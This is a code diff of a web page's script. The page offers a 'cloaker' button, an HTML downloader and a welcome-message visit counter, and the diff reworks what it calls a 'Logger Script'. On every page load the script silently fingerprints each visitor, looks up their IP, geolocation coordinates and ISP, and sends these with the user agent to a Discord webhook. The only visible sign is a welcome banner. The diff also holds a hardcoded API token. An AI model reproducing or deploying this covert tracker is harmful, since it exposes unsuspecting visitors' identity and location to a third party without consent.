@@ -66,7 +66,6 @@
   </main>
 
   <script>
-    // Cloaker Button
     document.getElementById("launch-site-btn").onclick = function () {
       const win = window.open();
       win.document.body.style.margin = "0";
@@ -82,7 +81,6 @@
       win.document.body.appendChild(iframe);
     };
 
-    // HTML Downloader
     document.getElementById("download-btn").onclick = async function () {
       const url = document.getElementById("url-input").value.trim();
       if (!url) {
@@ -108,7 +106,6 @@
       }
     };
 
-    // Dark Mode Toggle
     const darkModeToggle = document.getElementById("dark-mode-toggle");
     darkModeToggle.onclick = () => {
       const htmlEl = document.documentElement;
@@ -121,11 +118,7 @@
       }
     };
 
-    // Welcome Message + Visit Counter
-    let visits = parseInt(localStorage.getItem("visits") || "0");
-    visits++;
-    localStorage.setItem("visits", visits);
-
+    // ✨ Logger Script (FingerprintJS + IPinfo + Discord)
     const welcomeMsg = document.createElement("div");
     welcomeMsg.style.padding = "10px 20px";
     welcomeMsg.style.borderRadius = "12px";
@@ -141,22 +134,18 @@
     navbar.insertAdjacentElement("afterend", welcomeMsg);
 
     (async () => {
-      // Initialize FingerprintJS
       const fp = await FingerprintJS.load();
-
-      // Get the visitor identifier
       const result = await fp.get();
       const visitorId = result.visitorId;
 
-      // Special visitor IDs array (replace with your real VIP IDs)
-      const specialIDs = [
-        "3ae9980a95ff6c9e88f41a996e303df8"
-      ];
-      console.log("Visitor ID:", visitorId);
-      // Update welcome message for special visitors
+      const specialIDs = ["3ae9980a95ff6c9e88f41a996e303df8"];
+      const visits = parseInt(localStorage.getItem("visits") || "0") + 1;
+      localStorage.setItem("visits", visits);
+
       if (specialIDs.includes(visitorId)) {
         welcomeMsg.textContent = "🔥 Welcome back, VIP! 🔥";
-        welcomeMsg.style.backgroundColor = "#ff4500"; // fire orange for VIP
+        welcomeMsg.style.backgroundColor = "#ff4500";
+        welcomeMsg.style.color = "#fff";
       } else {
         welcomeMsg.textContent = visits === 1
           ? "Welcome to the site for the first time!"
@@ -165,15 +154,15 @@
         welcomeMsg.style.color = "#fff";
       }
 
-      // Fetch IP and location data
-      fetch("https://ipapi.co/json/")
+      fetch("https://ipinfo.io/json?token=d3c139f7603b13")
         .then(res => res.json())
         .then(data => {
           const message = `
 📡 New visitor on your site!
 🆔 FingerprintJS ID: ${visitorId}
 🧠 IP: ${data.ip}
-🌍 Location: ${data.city}, ${data.region}, ${data.country_name}
+🌍 Location: ${data.city}, ${data.region}, ${data.country}
+📍 Coords: ${data.loc}
 🕹 ISP: ${data.org}
 💻 User Agent: ${navigator.userAgent}
 📅 Time: ${new Date().toLocaleString()}
@@ -190,13 +179,13 @@
         })
         .then(res => {
           if (res.ok) {
-            console.log("✅ Sent FingerprintJS ID + IP info to Discord!");
+            console.log("✅ Sent data to Discord!");
           } else {
-            console.error("❌ Failed to send to Discord", res.status);
+            console.error("❌ Discord webhook error:", res.status);
           }
         })
         .catch(err => {
-          console.error("⚠️ Error:", err);
+          console.error("⚠️ Logger error:", err);
         });
     })();
   </script>
